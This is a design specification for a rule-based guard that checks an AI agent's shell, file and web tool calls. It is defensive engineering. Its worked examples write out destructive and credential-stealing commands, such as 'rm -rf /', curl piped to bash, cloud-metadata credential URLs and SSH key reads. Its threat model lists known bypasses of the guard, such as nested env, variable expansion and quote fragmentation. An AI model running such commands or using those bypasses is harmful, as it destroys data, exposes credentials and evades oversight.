# Tool Guards Specification

## 1. Overview and Goals

### 1.1 Problem Statement

When an AI agent has access to tools, a single hallucinated or misguided call can cause irreversible damage: deleting files, force-pushing over git history, overwriting credentials, or exfiltrating secrets via network fetches.

The tool guard is a **unified guard framework** that sits between agent tool calls and tool execution. It applies tool-appropriate checks before execution:
- `shell`: regex-based command inspection
- File tools (`read_file`, `read_many_files`, `write_file`, `edit_file`, `apply_patch`, `grep`): path-based risk checks
- `web_fetch`: URL/domain-based checks for SSRF and unsafe destinations

The goal is to block known-destructive behavior and guide the LLM toward safe alternatives via actionable suggestions.

### 1.2 Threat Model

The tool guard is a **friction layer, not a security boundary**.

**What it catches in the current scope:**
- Common destructive commands issued by well-meaning but imprecise agents (`rm -rf .`, `git push --force`, `DROP TABLE users`)
- Obfuscation patterns whose only purpose in an agent context is guard bypass (`base64 -d | bash`, `eval $(...)`)
- File access and mutation risks (sensitive paths, system paths, writes outside workspace, `.git` internals)
- Basic SSRF and metadata credential fetch patterns (`localhost`, private IP ranges, cloud metadata endpoints)

**What it does not catch in the current scope:**
- Determined adversarial bypass via shell indirection (quote fragmentation, variable expansion, script indirection, multi-step staged attacks)
- Variable expansion (e.g., `rm -rf $HOME` — the guard sees the literal string `$HOME`, not the expanded path; common literal equivalents like `~` and `/home` are covered)
- Command wrapping via nested `env` (e.g., `env env env bash -c "rm -rf /"` — the guard strips a single `env` prefix before wrapper detection, but chained `env` invocations beyond depth limits remain a bypass vector)
- Novel destructive commands not covered by pattern packs
- Redirections to non-system paths outside the working directory for shell-only analysis (e.g., `echo "" > ../../../important-project/data.db` — shell regex rules focus on known high-risk targets)
- Data exfiltration or side-channel attacks
- Sensitive data reads targeting paths not in the `sensitive_read` rule's path list (§6.3.1) — the rule covers common credential and key files (`/etc/shadow`, `~/.ssh/*`, `~/.aws/*`, etc.) but cannot enumerate all sensitive paths
- Symlink-based path escapes (path normalization does not call `fs::canonicalize()` in the current scope)
- DNS rebinding and IP-obfuscation SSRF bypasses (URL checks are string/parse based, not connection-layer resolved IP enforcement)

Regex and rule-based guards are provably incomplete. The guard reduces the probability of accidental damage from common agent mistakes. For true containment at `trustLevel: low`, OS-level sandboxing (bubblewrap, Landlock) should be layered underneath as defense-in-depth. That sandboxing layer is out of scope for this spec and may be implemented later as a "Tool Execution Environment" (see `coding-agent-loop-spec.md`, §4).

### 1.3 Design Principles

1. **Spec-first development.** This spec is the development target. Implementation is validated against it; tests are derived from it.
2. **Safe by default.** The default trust level (`medium`) blocks known-destructive commands. Agents must opt in to relaxed enforcement.
3. **Actionable denials.** Every denial includes a `reason` (why it was blocked) and a `suggestion` (what to do instead). The LLM sees these as tool output and adjusts.
4. **Single guard policy, per-tool dispatch.** One `ToolGuard` policy object evaluates all guarded tools, dispatching to shell/file/web evaluators by tool name.
5. **No false sense of security.** The guard does not claim to be a sandbox. Documentation and naming reflect that it is a friction layer.
6. **Compiled-in rules.** Shell patterns and file/web rule lists are Rust constants. No runtime config files, no YAML loading, no user-authored packs.
7. **No lookaround in patterns.** The Rust `regex` crate (and `RegexSet`) does not support lookahead or lookbehind assertions. All patterns must be expressible without them. Where exclusion logic is needed (e.g., matching `--force` but not `--force-with-lease`), use post-match validators (§4.4 Phase B) instead of regex lookahead.

### 1.4 Rationale and Prior Art

The tool guard design draws on a growing body of work around AI agent safety. This section documents why guardrails are needed and how existing approaches informed the design.

#### 1.4.1 Why Agents Need Tool Guards

AI coding agents interact with the outside world through tools — executing shell commands, reading and writing files, and fetching web content. Each tool surface carries distinct risks, and the failure modes are not theoretical:

**Shell commands** are the highest-risk surface. Cursor's autorun denylist was [bypassed via base64 encoding, subshell wrapping, and quote fragmentation](https://www.backslash.security/blog/cursor-ai-security-flaw-autorun-denylist), demonstrating that naive keyword matching is insufficient. An [analysis of 43% of open-source MCP servers](https://arxiv.org/abs/2508.10991) found command injection vulnerabilities, showing that tool descriptions themselves can be prompt injection vectors. Academic work on [fault-tolerant sandboxing for AI coding agents](https://arxiv.org/abs/2512.12806) established a three-category command taxonomy (safe/uncertain/unsafe) and showed 100% interception is achievable at 14.5% overhead.

**File operations** are a quieter but equally dangerous surface. An agent with unrestricted write access can overwrite `.git/` internals, corrupt configuration, modify shell startup files for persistence, or read credentials and private keys into its context window — where they may be logged, transmitted to model providers, or echoed into generated output. Path traversal (e.g., `../../etc/shadow`) is a classic web security vulnerability that transfers directly to agent file tools.

**Web fetches** introduce SSRF risk. An agent instructed to "fetch documentation" can be steered — through prompt injection in prior context or in fetched content itself — toward internal network endpoints, cloud metadata services (`169.254.169.254`), or credential URLs. Unlike a browser, an agent's HTTP client typically runs without network namespace isolation, making it a direct proxy into the host's network.

These findings motivate a layered approach: fast rule-based guards catch the common cases across all tool surfaces, while heavier isolation mechanisms (out of scope for this spec) provide defense-in-depth.

#### 1.4.2 Reference Implementations

The following projects informed the tool guard architecture across shell, file, and web domains. These serve as coverage checklists and architectural inspiration.

**Shell Pattern Architecture and Evaluation Pipelines**

- **[Destructive Command Guard (dcg)](https://github.com/Dicklesworthstone/destructive_command_guard)** — Library with a pack-based taxonomy of destructive commands. Key ideas adopted: safe-before-destructive evaluation order (safe patterns short-circuit before destructive checks), per-pack organization by domain (filesystem, git, database, cloud), and keyword-based quick-reject (we use compiled `RegexSet` instead, which is fast enough at agent throughput). License is incompatible; referenced for category coverage only.

- **[Codex execpolicy](https://github.com/openai/codex/tree/main/codex-rs/execpolicy)** — Rust policy engine used by OpenAI's Codex CLI. Key ideas adopted: three-tier verdicts (`Allow`/`Prompt`/`Forbidden` → our `Allow`/`Warn`/`Deny`), strictest-wins semantics across sub-commands, and `bash -c` inner command extraction. Also reviewed: token-prefix allowlists — deferred as the complexity-to-value ratio is unfavorable for this scope (see §12). Tightly coupled to the Codex runtime; not reusable as a library.

**Shell Guard Implementations**

- **[BodAIGuard](https://dev.to/axonlabsdev/your-ai-agent-just-ran-rm-rf-heres-how-to-stop-it-425c)** — Shell-aware guard with three-pass normalization: raw command → base64-decode rescan → unicode-normalize. Key insight adopted: `$(...)` sub-expression parsing must happen before pattern matching, or embedded commands bypass the guard.

- **[SafeExec (Agentify)](https://github.com/agentify-sh/safeexec)** — Hard-mode approach using `dpkg-divert` to intercept binaries at the OS level, with TTY-gated confirmation. Demonstrates the gap between userspace guards and OS-level enforcement. Informs our threat model: the regex guard is a friction layer, not binary diversion.

- **[SafeShell](https://github.com/qhkm/safeshell)** — Reversibility-first design using hard-link checkpoints before destructive commands. Informs a potential future `Checkpoint` verdict (§12).

- **[ai-runtime-guard](https://github.com/jimmyracheta/ai-runtime-guard)** — Blast radius simulation via glob expansion counting and cumulative session budget tracking. Informs potential future budget-based guard escalation (§12).

**File and Path Security**

- **OWASP [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)** — Canonical reference for `../` traversal attacks. Informs the file guard's path normalization pipeline (resolving `~`, `..`, and relative paths against the working directory) and the `outside_workspace_*` rules. The guard's approach — normalize then compare against a workspace root — mirrors OWASP's recommended "canonicalize then validate" mitigation.

- **CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)** — The file guard's system-path and sensitive-path rules directly address this weakness class. The shared path lists (§6.5) are derived from common credential, key, and system configuration paths documented in CWE-22 examples and Linux filesystem hierarchy standards.

**Web / SSRF Prevention**

- **OWASP [Server-Side Request Forgery (SSRF)](https://owasp.org/www-community/attacks/Server-Side_Request_Forgery)** — Canonical reference for SSRF attack patterns. Informs the web guard's `internal_network`, `metadata_endpoint`, and `credential_url` rules. The guard's approach — URL parsing with host/IP/port classification — follows OWASP's input validation layer, while acknowledging that DNS rebinding and IP obfuscation require connection-layer enforcement (deferred, §12).

- **Cloud provider metadata hardening** ([AWS IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html), [GCP metadata concealment](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)) — Documents the metadata endpoints (`169.254.169.254`, `metadata.google.internal`) and credential paths that the web guard blocks. IMDSv2's token requirement is a provider-side mitigation; the guard provides a client-side layer that blocks metadata access regardless of provider configuration.

**Production Agent Sandboxing**

- **[Claude Code sandboxing](https://www.anthropic.com/engineering/claude-code-sandboxing)** — Anthropic's approach using bubblewrap (Linux) and Seatbelt (macOS) for filesystem and network namespace isolation, achieving 84% reduction in permission prompts. Demonstrates that OS-level isolation and rule-based guards are complementary, not competing approaches. Informs the file guard's workspace-root anchoring (analogous to bubblewrap's filesystem bind-mount boundaries) and the web guard's network rules (analogous to Seatbelt's network filtering).

- **[Gemini CLI policy engine](https://geminicli.com/docs/reference/policy-engine/)** — Hierarchical TOML policy rules with approval modes orthogonal to trust level. Key insight: trust levels and approval modes serve different purposes. Gemini's policy engine also applies to file operations (read/write path rules), reinforcing the unified guard approach adopted here. This spec adopts trust levels; approval modes are deferred.

#### 1.4.3 Design Decisions

**Cross-cutting decisions (all guard domains)**

| Decision | Chosen Approach | Alternative Considered | Rationale |
|----------|----------------|----------------------|-----------|
| Guard architecture | Single `ToolGuard` dispatching to per-domain evaluators | Separate guard per tool | Unified policy object ensures consistent trust-level enforcement and single audit path. Per-domain evaluators keep each domain's logic self-contained. |
| Verdict model | `Allow`/`Warn`/`Deny` | `Allow`/`Deny` only | `Warn` enables `trustLevel: high` to log without blocking medium-confidence matches. Three tiers match Codex's model. |
| Denial delivery | Tool output text | Error return | Non-error delivery keeps the session alive and gives the LLM a clear explanation with suggestions. |
| Guard scope | All sessions (API + CLI) | API-only | The guard is a property of the agent, not the session type. Consistent enforcement regardless of entry point. |
| Rule storage | Compiled-in constants | Runtime YAML/TOML files | Zero I/O overhead, no config file management, type-checked at compile time. Applies to shell packs, file path lists, web port lists, and domain rules alike. |

**Shell-specific decisions**

| Decision | Chosen Approach | Alternative Considered | Rationale |
|----------|----------------|----------------------|-----------|
| Pattern matching | Compiled `RegexSet` | Keyword quick-reject + regex | At agent throughput (1–10 cmds/min), compiled regex is fast enough. Simpler pipeline, fewer moving parts. |
| Inner command extraction | `bash -c` unwrap + `&&`/`||`/`;` split | Full AST parsing (tree-sitter) | Covers the common agent patterns without heavy dependencies. AST parsing is deferred as a future enhancement. |
| Exclusion logic | Post-match validators (Phase B) | Regex negative lookahead | Rust `regex`/`RegexSet` does not support lookaround. Validators are more expressive and testable. |

**File-specific decisions**

| Decision | Chosen Approach | Alternative Considered | Rationale |
|----------|----------------|----------------------|-----------|
| Path normalization | Lexical (`~`, `..`, relative→absolute) without `canonicalize()` | `fs::canonicalize()` (resolves symlinks) | Avoids filesystem I/O on every guard check. Symlink resolution is deferred (§12). |
| Workspace boundary | Fixed at parent session root | Per-subagent scoped roots | Prevents subagents from widening the boundary. Conservative — a child agent in a subdirectory is still bounded by the parent's workspace. |

**Web-specific decisions**

| Decision | Chosen Approach | Alternative Considered | Rationale |
|----------|----------------|----------------------|-----------|
| SSRF detection | URL-parse-based host/IP/port classification | Connection-layer resolved-IP enforcement | String-based checks are fast and have no runtime dependencies. DNS rebinding defense requires intercepting the HTTP connection layer, which is deferred (§12). |
| Domain lists | Schema-level `allowedDomains`/`disallowedDomains` | Per-request approval prompts | Declarative lists are agent-authorable and require no interactive approval. Allowlist-wins precedence is simple and unambiguous. |

---

## 2. Schema

### 2.1 `trustLevel` Property

Added to `schema/Agent.yaml`:

```yaml
trustLevel:
  "@id": stencila:trustLevel
  description: Trust level controlling how strictly the agent's operations are guarded.
  $comment: |
    Controls tool guard behavior across shell, file, and web tools.
    - "low": shell is default-deny — all commands are denied unless they
      match a known-safe pattern (e.g. `git status`). File and web tools
      are rule-based (not default-deny): unmatched paths/URLs are allowed,
      but matched rules apply their strictest verdicts (e.g.,
      outside-workspace reads/writes are denied, sensitive paths are denied).
    - "medium" (default): default-allow with destructive behavior blocking.
      High/medium confidence shell rules are denied; file/web rules follow
      their per-rule trust behavior (see §3.1 decision table).
    - "high": default-allow with relaxed blocking. High-confidence matches
      are still denied; medium-confidence shell matches become warnings
      instead of denials; some file/web rules are relaxed to warnings or
      allowed (see §3.1 decision table).
  type: string
  default: medium
  enum:
    - low
    - medium
    - high
```

The `default: medium` ensures that Rust codegen produces `Default::default() == TrustLevel::Medium`.

### 2.2 `allowedDomains` and `disallowedDomains`

Added to `schema/Agent.yaml`:

```yaml
allowedDomains:
  "@id": stencila:allowedDomains
  description: Domain allowlist for web_fetch.
  $comment: |
    Supports exact hosts and `*.` wildcard subdomain entries.
    `*.example.com` matches subdomains only, not `example.com`.
    If set, domains not in this list are denied.
    If both allowedDomains and disallowedDomains are set, allowlist wins
    and disallowedDomains is silently ignored. Do not set both unless you
    intend allowlist-only behavior.
  type: array
  items:
    type: string

disallowedDomains:
  "@id": stencila:disallowedDomains
  description: Domain denylist for web_fetch.
  $comment: |
    Supports exact hosts and `*.` wildcard subdomain entries.
    If set without allowedDomains, matching domains are denied.
    If both allowedDomains and disallowedDomains are set, allowlist wins
    and this list is silently ignored. Do not set both unless you intend
    allowlist-only behavior.
  type: array
  items:
    type: string
```

### 2.3 AGENT.md Examples

```yaml
---
name: code-engineer
description: A general-purpose code assistant with guarded tools
model: claude-sonnet-4-5
provider: anthropic
trustLevel: medium
---
```

```yaml
---
name: docs-researcher
description: Fetches and summarizes trusted docs
model: claude-sonnet-4-5
trustLevel: medium
allowedDomains:
  - "docs.rs"
  - "*.docs.rs"
  - "doc.rust-lang.org"
  - "developer.mozilla.org"
---
```

---

## 3. Trust Level Semantics

### 3.1 Decision Table

| Guard Domain | `low` | `medium` (default) | `high` |
|-------------|-------|---------------------|--------|
| Shell: unmatched command | **deny** | **allow** | **allow** |
| Shell: high-confidence destructive | **deny** | **deny** | **deny** |
| Shell: medium-confidence destructive | **deny** | **deny** | **warn** |
| Shell: known-safe pattern (e.g. `git status`) | **allow** | **allow** | **allow** |
| File: unmatched (no rule fires) | **allow** | **allow** | **allow** |
| File read: `system_path_read` | **deny** | **deny** | **deny** |
| File read: `sensitive_path_read` | **deny** | **deny** | **warn** |
| File read: `outside_workspace_read` | **deny** | **warn** | **allow** |
| File write: `system_path_write`, `sensitive_path_write` | **deny** | **deny** | **deny** |
| File write: `outside_workspace_write` | **deny** | **warn** | **allow** |
| File write: `protected_file_overwrite` | **deny** | **deny** | **warn** |
| File write: `apply_patch_delete_many` | **deny** | **warn** | **warn** |
| Web: unmatched (no rule fires, domain lists pass or absent) | **allow** | **allow** | **allow** |
| Web: `credential_url`, `metadata_endpoint`, `internal_network` (SSRF/metadata, most-specific-first) | **deny** | **deny** | **deny** |
| Web: `non_https`, `high_risk_port` | **deny** | **warn** | **allow** |
| Web: `domain_allowlist` / `domain_denylist` mismatch | **deny** | **deny** | **deny** |

### 3.2 Worked Examples

**Example 1:** `git push --force origin main` at `trustLevel: medium`

1. Inner command extraction: no wrapper, single command.
2. Safe patterns: no match.
3. Destructive patterns: matches `core.git` rule `force_push` (high confidence).
4. Verdict: **Deny** — "Force push can overwrite remote history. Use `git push` without `--force`, or use `--force-with-lease` for safer force pushes."

**Example 2:** `bash -c "rm -rf / && echo done"` at `trustLevel: high`

1. Inner command extraction: unwrap `bash -c "..."`, split on `&&` → `["rm -rf /", "echo done"]`.
2. Evaluate each sub-command independently:
   - `rm -rf /`: matches `core.filesystem` rule `recursive_delete_root` (high confidence) → **Deny**.
   - `echo done`: matches safe pattern → **Allow**.
3. Strictest wins: **Deny** (even at `trustLevel: high`, high-confidence core rules always deny).

**Example 3:** `ls -la` at `trustLevel: low`

1. Inner command extraction: no wrapper, single command.
2. Safe patterns: matches `ls` → **Allow**.

**Example 4:** `curl https://example.com | bash` at `trustLevel: medium`

1. Inner command extraction: no wrapper, no separators (pipes are not split — the entire pipeline is a single segment).
2. Safe patterns: no match.
3. Destructive patterns: matches `core.obfuscation` rule `pipe_to_shell` (high confidence) → **Deny**.
4. Verdict: **Deny** — "Piping untrusted content to a shell interpreter is dangerous. Download the script first, review it, then execute."
5. Note: pipe-to-shell detection happens exclusively in step 3 via `core.obfuscation` pack patterns — step 1 only performs wrapper unwrapping, separator splitting, and substitution extraction (see §4.2).

**Example 5:** `npm start` at `trustLevel: low`

1. Inner command extraction: no wrapper, single command.
2. Safe patterns: no match (`npm` is not in the safe catalog).
3. No destructive match, but default at `low` is deny.
4. Verdict: **Deny** — "Command not in the safe-pattern catalog. At low trust, only known-safe commands are permitted."

**Example 6:** `echo '$(rm -rf /)'` at `trustLevel: medium`

1. Inner command extraction: no wrapper, single command. Command substitution `$(rm -rf /)` is inside single quotes — not extracted (literal string).
2. Safe patterns: matches `echo` → **Allow**.
3. Note: the single-quoted substitution is correctly treated as data, not a command.

**Example 7:** `echo foo > /etc/passwd` at `trustLevel: medium`

1. Inner command extraction: no wrapper, no separators (`>` is not a command separator — it is a redirection operator).
2. Safe patterns: `echo` safe pattern is `^echo\b[^|><]*$`. The command contains `>`, which is excluded by the character class `[^|><]`, so the regex does **not** match. Falls through to step 3.
3. Destructive patterns: matches `core.filesystem` rule `overwrite_truncate` (medium confidence) → **Deny**.
4. Note: without the `[^|><]` exclusion, a pattern like `^echo\b.*$` would match the full string (since `.*` consumes `>`), short-circuiting to Allow and bypassing the destructive check.

**Example 8:** `git status\nrm -rf /` (newline-separated) at `trustLevel: medium`

1. Inner command extraction: split on `\n` → `["git status", "rm -rf /"]`.
2. Evaluate each sub-command independently:
   - `git status`: safe pattern match → **Allow**.
   - `rm -rf /`: matches `core.filesystem` rule `recursive_delete_root` (high confidence) → **Deny**.
3. Strictest wins: **Deny**.
4. Note: without newline splitting, this would be evaluated as one segment and `git status` could short-circuit the entire command as safe.

**Example 9:** `ls & rm -rf /tmp/data` (background operator) at `trustLevel: medium`

1. Inner command extraction: split on `&` (single, not `&&`) → `["ls", "rm -rf /tmp/data"]`.
2. Evaluate each sub-command independently:
   - `ls`: safe pattern match → **Allow**.
   - `rm -rf /tmp/data`: matches `core.filesystem` rule `recursive_delete_force` (high confidence) → **Deny**.
3. Strictest wins: **Deny**.

**Example 10:** `bash -c "bash -c 'rm -rf /'"` (nested wrapper) at `trustLevel: medium`

1. Inner command extraction: detect `bash -c "..."`, unwrap → `bash -c 'rm -rf /'`.
2. Recursive: detect `bash -c '...'`, unwrap → `rm -rf /`.
3. No further wrappers. Evaluate `rm -rf /`: matches `core.filesystem` rule `recursive_delete_root` (high confidence) → **Deny**.
4. Note: wrapper unwrapping is limited to 5 levels of recursion (§4.2).

**Example 11:** `echo "$(rm -rf /)"` (substitution in double quotes) at `trustLevel: medium`

1. Inner command extraction: no wrapper, single command. Command substitution `$(rm -rf /)` is inside double quotes — extracted (the shell evaluates `$(...)` inside double quotes).
2. Segments: `["echo \"$(rm -rf /)\""]`. Extracted substitutions: `["rm -rf /"]`.
3. Evaluate outer segment `echo "$(rm -rf /)"`: the `echo` safe pattern regex `^echo\b[^|><]*$` matches the full string (none of the characters in `"$(rm -rf /)"` are `|`, `>`, or `<`). However, step 1 already extracted the `$(rm -rf /)` substitution, and per §4.5 (multi-command verdict resolution), extracted substitutions are always evaluated independently regardless of the outer segment's verdict.
4. Evaluate extracted `rm -rf /`: matches `core.filesystem` rule `recursive_delete_root` (high confidence) → **Deny**.
5. Strictest wins across segments + extracted substitutions: **Deny**.
6. Note: contrast with Example 6 (`echo '$(rm -rf /)'`) where single quotes make the substitution literal — it is not extracted, so only the outer segment is evaluated.

**Example 12:** `bash -lc "git reset --hard"` (combined flags) at `trustLevel: medium`

1. Inner command extraction: detect `bash -lc "..."` (combined `-l` + `-c` flags), unwrap → `git reset --hard`.
2. No further wrappers. Evaluate `git reset --hard`: matches `core.git` rule `reset_hard` (high confidence) → **Deny**.
3. Note: the `-lc` combined flag form is recognized alongside `-c` (§4.2).

**Example 13:** `bash -l -c "git reset --hard"` (separate flag tokens) at `trustLevel: medium`

1. Inner command extraction: detect `bash -l -c "..."` (separate `-l` and `-c` flag tokens), unwrap → `git reset --hard`.
2. No further wrappers. Evaluate `git reset --hard`: matches `core.git` rule `reset_hard` (high confidence) → **Deny**.
3. Note: the separate flag token form (`-l -c`) is recognized alongside combined (`-lc`) and standalone (`-c`) forms (§4.2).

**Example F1:** `read_file { path: "~/.ssh/id_rsa" }` at `trustLevel: medium`

1. File guard normalizes path to user home ssh key location.
2. Path matches `file.sensitive_path_read` (medium confidence).
3. Verdict at medium trust: **Deny**.

**Example F2:** `apply_patch` deleting 7 files at `trustLevel: high`

1. `apply_patch` parser extracts all changed paths and counts `DeleteFile` operations.
2. Delete count (`7`) triggers `file.apply_patch_delete_many`.
3. Verdict at high trust: **Warn** (allowed with warning/audit).

**Example F3:** `write_file { path: "/etc/hosts" }` at any trust level

1. Path matches `file.system_path_write` (high confidence).
2. Verdict: **Deny** at all trust levels.

**Example W1:** `web_fetch { url: "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }` at any trust level

1. URL parse succeeds; host `169.254.169.254` is in `METADATA_HOSTS` and path matches `CREDENTIAL_PATH_PREFIXES`.
2. Rule `web.credential_url` fires first (most-specific-first order). Evaluation short-circuits.
3. Verdict: **Deny** at all trust levels with `rule_id = "web.credential_url"`. (Note: `web.metadata_endpoint` and `web.internal_network` would also match, but `credential_url` fires first, providing the most specific audit signal.)

**Example W2:** `web_fetch { url: "http://example.com/api" }` at `trustLevel: medium`

1. URL parse succeeds; no internal/metadata rule matches.
2. Scheme `http` matches `web.non_https`.
3. Verdict: **Warn** at medium trust.

**Example W3:** `web_fetch { url: "https://evil.com" }` with `allowedDomains: ["*.docs.rs"]`

1. Built-in rules: no match.
2. Allowlist check fails.
3. Verdict: **Deny** with `rule_id = "web.domain_allowlist"`.

**Example F4:** `edit_file { path: ".git/hooks/pre-commit", old_string: "...", new_string: "..." }` at `trustLevel: medium`

1. File guard normalizes path against working directory → `/home/user/project/.git/hooks/pre-commit`.
2. Path component `.git` matches `file.protected_file_overwrite`.
3. Verdict at medium trust: **Deny** — "Writing to `.git/` internals can corrupt repository state. Edit hooks or config via `git config` or manual review outside the agent."

**Example F5:** `write_file { path: "../other-project/config.yaml", content: "..." }` at `trustLevel: medium`

1. File guard normalizes path against working directory (e.g., `/home/user/project`) → `/home/user/other-project/config.yaml`.
2. Normalized path is outside session workspace root (`/home/user/project`).
3. Rule `file.outside_workspace_write` matches.
4. Verdict at medium trust: **Warn** — write is allowed but logged. The agent sees a warning: "Write target is outside the session workspace root."

**Example F6:** `read_file { path: "../../other-project/data.db" }` at `trustLevel: medium`

1. File guard normalizes path against working directory → `/home/user/other-project/data.db`.
2. Normalized path is outside session workspace root (`/home/user/project`).
3. Rule `file.outside_workspace_read` matches.
4. Verdict at medium trust: **Warn** — read is allowed but logged. The agent sees a warning: "Read target is outside the session workspace root. Verify the path is intended."

### 3.3 Safe Patterns for `trustLevel: low`

At `low` trust, only commands matching a known-safe pattern are allowed. The catalog is intentionally conservative — agents at this level have limited capabilities by design.

| Category | Safe Patterns |
|----------|---------------|
| Read-only filesystem | `ls`, `cat`, `head`, `tail`, `less`, `wc`, `file`, `stat`, `find` (no `-delete`/`-exec`/`-execdir`/`-ok`/`-okdir`/`-fprint`/`-fls`/`-fprintf`), `du`, `df`, `tree`, `grep`, `rg`, `diff`, `sort`, `md5sum`, `sha256sum`, `realpath`, `dirname`, `basename`, `readlink`, `test`, `[`, `[[` |
| Read-only git | `git status`, `git log`, `git diff`, `git show`, `git branch` (no `-D`/`-d`), `git tag` (no `-d`), `git remote -v`, `git rev-parse` |
| Read-only build inspection | `cargo check`, `cargo clippy` (no `--fix`), `go vet` |
| Environment inspection | `env`, `printenv`, `which`, `whoami`, `uname`, `pwd`, `echo`, `date`, `hostname`, `id`, `groups` |
| Safe filesystem mutation | `mkdir`, `touch` |
| Stencila read-only | `stencila secrets list`, `stencila auth status`, `stencila cloud status`, `stencila db status`, `stencila db log`, `stencila db verify`, `stencila status`, `stencila formats list`, `stencila models list` |

**Implementation note:** Each entry in the table above is a **separate, fully-anchored regex** following the standard safe pattern form `^command\b[^|><]*$` (see §4.3 and §6.2 rule 1). Multi-word entries like `stencila secrets list` are single regex patterns (e.g., `^stencila\s+secrets\s+list\b[^|><]*$`), not prefix matches. A broad pattern like `^stencila\b[^|><]*$` would incorrectly allow `stencila publish` at `low` trust and must not be used.

**Safe mutation rationale:** `mkdir` and `touch` are included despite modifying the filesystem because they are non-destructive (creating directories and empty files cannot destroy existing data) and are extremely common in agent-generated commands. `mkdir -p` creating nested directories is also safe. These commands do not accept flags that could cause data loss.

**Conditional test rationale:** `test`, `[`, and `[[` are shell builtins for conditional evaluation (file existence, string comparison, etc.). They have no side effects and are frequently used in agent-generated commands (e.g., `test -f file && ...`, `[ -d dir ]`). `readlink` is a read-only symlink resolution command.

**Build inspection rationale:** `cargo check` and `cargo clippy` invoke the Rust compiler, which executes build scripts and proc macros — these could in theory run arbitrary code. They are included in the low-trust safe list because they do not execute the built artifact, and build script execution is an accepted risk at this level (it is also a risk for `go vet`, which compiles the package). Build commands that execute the resulting artifact (`cargo test`, `cargo run`, `go test`) are excluded — see below.

**Excluded from `low` safe patterns:** Build and test commands (`cargo build`, `cargo test`, `cargo fmt`, `npm test`, `python -m pytest`, `go test`, `go build`) are intentionally omitted despite appearing benign. These execute arbitrary project code (build scripts, test fixtures, formatters) that can run arbitrary commands, mutate files, or access the network — violating the default-deny model. Generic script launchers (`npm run`, `npx`, `make`) are excluded for the same reason. Agents at `low` trust that need build/test capabilities must operate at `medium` trust.

Each safe pattern must be strictly anchored at both start (`^`) and end (`$`), and must include negative tests against known destructive variants (e.g., `git branch` must not match `git branch -D`) and unsplit shell operators — pipes (`cat file | bash`) and redirections (`echo foo > /etc/passwd`). Separator-based chaining (`&&`, `;`, `&`, `\n`) is tested at the pipeline level (verifying step 1 splitting), not at the safe-pattern regex level. See §4.3 and §6.2 rule 2 for the full testing requirements.

The `find` safe pattern uses the two-phase approach defined in §4.3: a regex (`^find\b[^|><]*$`) for the Phase A candidate scan (note: `[^|><]` is required per the safe pattern termination requirement — see §4.3 and §6.2 rule 1), and a **post-match validator** (Phase B) that tokenizes the command using shlex-style splitting and returns `false` (not safe — fall through to step 3) if any token is an **exact string match** for `-delete`, `-exec`, `-execdir`, `-ok`, `-okdir`, `-fprint`, `-fls`, or `-fprintf`. The `-fprint`/`-fls`/`-fprintf` primaries write to files and violate the read-only constraint at `low` trust. Exact token equality (not substring or prefix matching) is required — this accurately distinguishes `find . -name "exec-summary.txt"` (allowed — `exec` is a substring in a filename argument, not a standalone token) from `find . -exec rm {} \;` (rejected — `-exec` is a standalone flag token). Test cases must cover these actions appearing at various positions, including after path arguments (e.g., `find . -okdir rm -rf {} \;` must be rejected).

**Coupling note:** The `find` safe validator and the `find_destructive` destructive rule (§6.3.1) both maintain lists of dangerous `find` flags. These lists must be kept in sync — if a new dangerous flag is added to one, it must be added to the other. The safe validator's list is a superset of the destructive rule's list: it includes `-fprint`/`-fls`/`-fprintf` (write-to-file primaries that violate read-only at `low` trust but are not destructive enough for a medium/high-trust denial). The safe validator is the primary defense at `low` trust (preventing short-circuit to Allow); the destructive rule is the primary defense at `medium`/`high` trust (actively denying). A flag missing from the safe validator but present in the destructive rule would still be caught at `medium`/`high` trust. A flag missing from both would be caught at `low` trust by default-deny, but allowed at `medium`/`high` trust — so both lists must be complete for their respective scopes. **Implementation note:** Both lists should reference shared `const` arrays of dangerous find flags (e.g., `const FIND_DESTRUCTIVE_FLAGS: &[&str]` and `const FIND_WRITE_FLAGS: &[&str]`) so additions are made in one place. A `#[cfg(test)]` assertion should validate that the safe validator's flag set is a superset of the destructive rule's flag set.

**Low trust pipeline limitation:** Because safe patterns use `[^|><]` to exclude pipe and redirection operators, read-only pipelines like `cat file | wc -l` or `grep pattern file | sort` do not match any safe pattern and are denied at `low` trust by default-deny. This is by design — pipelines can chain into dangerous operations, and the regex guard cannot distinguish safe from unsafe pipelines without full AST parsing. Agents at `low` trust that need pipeline support must operate at `medium` trust.

---

## 4. Guard Implementations

This section defines the three guard evaluators: **shell** (§4.1–§4.6), **file** (§4.7), and **web** (§4.8). Each evaluator is self-contained but shares the `GuardVerdict` type (§7) and trust-level semantics (§3).

### 4.1 Shell Guard Overview

**Input length limit:** Before entering the pipeline, the guard checks the raw command string length. Commands exceeding **8,192 bytes** are denied with reason "Command exceeds maximum length for shell guard evaluation" and suggestion "Break the command into smaller steps." This prevents pathological inputs (e.g., deeply nested substitutions, very long pipelines) from causing excessive evaluation time. The 8KB limit is well above the longest legitimate agent commands (typically under 1 KB) while remaining well below `ARG_MAX` on Linux (2 MB) and the practical context window cost of embedding long commands in tool calls.

**Parse failure behavior (fail-closed):** If any stage of the extraction/tokenization pipeline encounters malformed input — unmatched quotes, unmatched parentheses in `$(...)`, unmatched backticks, invalid escape sequences, or any other parse error — the guard returns `Deny` with reason "Unable to safely parse command for guard evaluation" and suggestion "Simplify the command to use standard quoting and syntax." This applies to wrapper unwrapping (§4.2), separator splitting (§4.2), and substitution extraction (§5.2). The fail-closed principle ensures that unparseable commands cannot bypass the guard. This is a normative requirement: implementations must not fall through to `Allow` on parse errors, regardless of trust level.

```
     Command ("bash -c 'git reset --hard && rm -rf /'")
              │
              ▼
  ┌─────────────────────────┐
  │ Step 1: Inner command   │  bash -c "X && Y" → evaluate X, Y separately
  │ extraction              │  Strictest verdict wins across sub-commands
  └───────────┬─────────────┘
              │
              ▼
  ┌─────────────────────────┐
  │ Step 2: Safe patterns   │── match ──→ ALLOW (short-circuit)
  │ (regex + validators)    │
  └───────────┬─────────────┘
              │ no safe match
              ▼
  ┌─────────────────────────┐
  │ Step 3: Destructive     │── match ──→ DENY (or WARN if high trust + medium confidence)
  │ patterns (regex +       │
  │ post-match validators)  │
  └───────────┬─────────────┘
              │ no match
              ▼
           ALLOW (medium/high) or DENY (low)
```

